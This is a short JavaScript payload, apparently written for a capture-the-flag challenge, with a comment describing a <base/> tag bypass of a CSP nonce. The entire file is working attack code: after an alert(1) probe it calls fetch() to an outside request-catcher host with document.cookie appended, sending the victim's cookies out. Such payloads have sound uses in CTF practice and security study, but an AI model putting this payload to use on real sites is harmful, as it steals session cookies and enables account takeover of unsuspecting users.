// This is for CTF challenge
// <base/> bypass CSP nonce
alert(1);
fetch("https://cx330.requestcatcher.com/" + document.cookie);
